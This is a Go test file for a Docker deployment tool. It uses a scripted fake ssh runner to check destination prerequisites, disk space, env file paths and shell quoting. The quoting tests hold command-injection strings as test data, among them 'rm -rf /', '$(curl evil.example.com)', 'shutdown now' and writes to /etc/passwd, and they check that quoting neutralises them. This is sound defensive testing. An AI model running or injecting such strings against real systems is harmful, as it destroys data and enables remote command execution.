package main

import (
	"errors"
	"io"
	"io/fs"
	"strings"
	"testing"
)

// scriptedRunner answers with canned output instead of running anything. It
// stands in for the far side of an ssh connection, which is the one boundary a
// test cannot have a real version of.
type scriptedRunner struct {
	host           string
	responses      map[string]string
	absentBinaries []string
	failCommands   []string
	directory      []string
	directories    map[string][]string
	files          map[string]string
	ran            []string
}

// runProbeScript interprets the shell script the real check sends, echoing the
// name of each probe that would have failed. Answering with a fixed list instead
// would let the test agree with itself about which probes were even sent.
func (runner *scriptedRunner) runProbeScript(script string) []byte {
	var reported []string

	for _, line := range strings.Split(script, "\n") {
		probe, name, found := strings.Cut(line, " >/dev/null 2>&1 || echo ")
		if !found {
			continue
		}
		for _, absent := range runner.absentBinaries {
			if strings.HasPrefix(probe, absent) {
				reported = append(reported, strings.Trim(name, "'"))
				break
			}
		}
	}

	return []byte(strings.Join(reported, "\n"))
}

func (runner *scriptedRunner) Describe() string {
	return runner.host
}

func (runner *scriptedRunner) Run(command []string) ([]byte, error) {
	joined := strings.Join(command, " ")
	runner.ran = append(runner.ran, joined)

	for _, failing := range runner.failCommands {
		if strings.Contains(joined, failing) {
			// the canned output matters as much as the failure, since callers
			// decide what to do by reading what docker said
			return []byte(runner.responses[failing]), errors.New("exit status 1")
		}
	}
	if len(command) == 3 && command[0] == "sh" && command[1] == "-c" {
		return runner.runProbeScript(command[2]), nil
	}
	for pattern, response := range runner.responses {
		if strings.Contains(joined, pattern) {
			return []byte(response), nil
		}
	}

	return nil, nil
}

func (runner *scriptedRunner) Stream(command []string, _ io.Writer) error {
	_, err := runner.Run(command)

	return err
}

func (runner *scriptedRunner) MkdirAll(string) error          { return nil }
func (runner *scriptedRunner) RemoveAll(string) error         { return nil }
func (runner *scriptedRunner) Pipe([]string, io.Reader) error { return nil }
func (runner *scriptedRunner) Interactive(command []string) error {
	runner.ran = append(runner.ran, strings.Join(command, " "))

	return nil
}

func (runner *scriptedRunner) WriteFile(name string, contents []byte) error {
	if runner.files == nil {
		runner.files = map[string]string{}
	}
	runner.files[name] = string(contents)

	return nil
}

// ReadFile answers a missing file the way the real ones do, since callers tell
// "never deployed" from "something is wrong" by exactly that error.
func (runner *scriptedRunner) ReadFile(name string) ([]byte, error) {
	contents, found := runner.files[name]
	if !found {
		return nil, fs.ErrNotExist
	}

	return []byte(contents), nil
}

func (runner *scriptedRunner) ListDirectory(directory string) ([]string, error) {
	if listing, found := runner.directories[directory]; found {
		return listing, nil
	}

	return runner.directory, nil
}

func newScriptedRunner() *scriptedRunner {
	return &scriptedRunner{
		host: "pi",
		responses: map[string]string{
			"docker version": "arm64\n",
			"DockerRootDir":  "/srv/projects/.docker\n",
			"df -Pk":         "Filesystem 1024-blocks Used Available Capacity Mounted\n/dev/sda2 376000000 4000000 353000000 2% /srv\n",
		},
	}
}

func TestDestinationCheckReportsExactlyWhatIsMissing(t *testing.T) {
	cases := []struct {
		name        string
		absent      []string
		hosted      bool
		wantMissing []string
	}{
		{name: "everything present"},
		{
			name:        "no docker at all",
			absent:      []string{"docker"},
			wantMissing: []string{"docker", "docker compose plugin"},
		},
		{
			name:        "docker without the compose plugin",
			absent:      []string{"docker compose"},
			wantMissing: []string{"docker compose plugin"},
		},
		{
			name:        "cloudflared missing but nothing is hosted",
			absent:      []string{"cloudflared"},
			wantMissing: nil,
		},
		{
			name:        "cloudflared missing and something is hosted",
			absent:      []string{"cloudflared"},
			hosted:      true,
			wantMissing: []string{"cloudflared"},
		},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			runner := newScriptedRunner()
			runner.absentBinaries = testCase.absent

			services := `"web": {"image": "nginx"}`
			if testCase.hosted {
				services = `"web": {"image": "nginx", "healthcheck": {}, "host": {"domain": "a.com", "port": 80, "tunnelTokenFrom": "T"}}`
			}
			resolved := loadAndResolve(t,
				`{"version": 1, "id": "a3f19c02", "name": "x", "services": {`+services+`}}`,
				defaultEnvironmentName,
			)

			_, err := CheckDestination(runner, resolved, NewLayout("/srv/projects", "a3f19c02"))

			if len(testCase.wantMissing) == 0 {
				if err != nil {
					t.Fatalf("expected the check to pass, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("expected %v to be reported missing", testCase.wantMissing)
			}
			for _, name := range testCase.wantMissing {
				if !strings.Contains(err.Error(), name) {
					t.Errorf("error should name %q, got: %v", name, err)
				}
			}
			if !strings.Contains(err.Error(), "pi") {
				t.Errorf("error should name the host it checked, got: %v", err)
			}
		})
	}
}

func TestDestinationCheckReadsArchitectureAndSpace(t *testing.T) {
	runner := newScriptedRunner()
	resolved := loadAndResolve(t,
		`{"version": 1, "id": "a3f19c02", "name": "x", "services": {"web": {"image": "nginx"}}}`,
		defaultEnvironmentName,
	)

	facts, err := CheckDestination(runner, resolved, NewLayout("/srv/projects", "a3f19c02"))
	if err != nil {
		t.Fatalf("CheckDestination: %v", err)
	}

	if facts.Architecture != "arm64" {
		t.Errorf("architecture = %q, want arm64", facts.Architecture)
	}
	if facts.DataRoot != "/srv/projects/.docker" {
		t.Errorf("data root = %q", facts.DataRoot)
	}
	if facts.FreeSpaceMB < 300000 {
		t.Errorf("free space = %d MB, want the parsed df value", facts.FreeSpaceMB)
	}
}

func TestAFullDestinationIsRefusedBeforeAnythingIsPlaced(t *testing.T) {
	runner := newScriptedRunner()
	// 100 MB free, well under the floor
	runner.responses["df -Pk"] = "Filesystem 1024-blocks Used Available Capacity Mounted\n/dev/mmcblk0p2 30000000 29000000 102400 99% /\n"

	resolved := loadAndResolve(t,
		`{"version": 1, "id": "a3f19c02", "name": "x", "services": {"web": {"image": "nginx"}}}`,
		defaultEnvironmentName,
	)

	_, err := CheckDestination(runner, resolved, NewLayout("/srv/projects", "a3f19c02"))
	if err == nil {
		t.Fatal("a destination with no room should be refused")
	}
	if !strings.Contains(err.Error(), "MB free") {
		t.Errorf("the error should say how much room is left, got: %v", err)
	}
}

func TestAMissingEnvFileFailsAtCheckTimeRatherThanContainerStart(t *testing.T) {
	const contents = `{
      "version": 1, "id": "a3f19c02", "name": "x",
      "services": {"web": {"image": "nginx", "env": [".env.production", "./committed.env"]}}
    }`
	resolved := loadAndResolve(t, contents, defaultEnvironmentName)
	layout := NewLayout("/srv/projects", "a3f19c02")

	runner := newScriptedRunner()
	runner.directory = nil

	_, err := CheckDestination(runner, resolved, layout)
	if err == nil {
		t.Fatal("a missing env file should stop the deploy before it starts")
	}
	if !strings.Contains(err.Error(), ".env.production") {
		t.Errorf("the error should name the missing file, got: %v", err)
	}
	if !strings.Contains(err.Error(), "deploy env push") {
		t.Errorf("the error should name the fix, got: %v", err)
	}
	// a path was committed with the code, so it is not ours to check
	if strings.Contains(err.Error(), "committed.env") {
		t.Errorf("a path-shaped entry should not be looked for in the env directory, got: %v", err)
	}

	runner.directory = []string{".env.production"}
	if _, err := CheckDestination(runner, resolved, layout); err != nil {
		t.Errorf("with the file present the check should pass, got: %v", err)
	}
}

func TestEnvFilePathsPointAtTheProjectEnvDirectory(t *testing.T) {
	layout := NewLayout("/srv/projects", "a3f19c02")

	got := EnvFilePaths(layout, []string{".env.production", "./config/local.env", "/etc/secrets.env"})
	want := []string{
		"/srv/projects/a3f19c02/env/.env.production",
		"./config/local.env",
		"/etc/secrets.env",
	}

	for index := range want {
		if got[index] != want[index] {
			t.Errorf("path %d = %q, want %q", index, got[index], want[index])
		}
	}
}

func TestShellQuoting(t *testing.T) {
	cases := []struct {
		argument string
		want     string
	}{
		{"simple", "'simple'"},
		{"with space", "'with space'"},
		{"it's", `'it'\''s'`},
		{"$(rm -rf /)", "'$(rm -rf /)'"},
		{"`whoami`", "'`whoami`'"},
		{"a;b", "'a;b'"},
		{"", "''"},
	}

	for _, testCase := range cases {
		if got := ShellQuote(testCase.argument); got != testCase.want {
			t.Errorf("ShellQuote(%q) = %s, want %s", testCase.argument, got, testCase.want)
		}
	}

	if got := ShellCommand([]string{"docker", "compose", "-f", "/a path/x.yml"}); got != "'docker' 'compose' '-f' '/a path/x.yml'" {
		t.Errorf("ShellCommand = %s", got)
	}
}

// Quoting is what stops a path or a command argument being re-parsed by the
// remote shell, so it has to survive the things a shell would otherwise act on.
func TestShellQuotingNeutralisesShellSyntax(t *testing.T) {
	dangerous := []string{
		"; rm -rf /",
		"$(curl evil.example.com)",
		"&& shutdown now",
		"| tee /etc/passwd",
		"../../etc/shadow",
	}

	for _, argument := range dangerous {
		quoted := ShellQuote(argument)

		if !strings.HasPrefix(quoted, "'") || !strings.HasSuffix(quoted, "'") {
			t.Errorf("ShellQuote(%q) = %s, which is not fully quoted", argument, quoted)
		}
		// the only way out of single quotes is an unescaped quote, and there is
		// no unescaped quote left after ShellQuote
		if strings.Contains(strings.TrimSuffix(strings.TrimPrefix(quoted, "'"), "'"), "'") {
			inner := strings.TrimSuffix(strings.TrimPrefix(quoted, "'"), "'")
			if !strings.Contains(inner, `'\''`) {
				t.Errorf("ShellQuote(%q) = %s, which escapes out of its quoting", argument, quoted)
			}
		}
	}
}
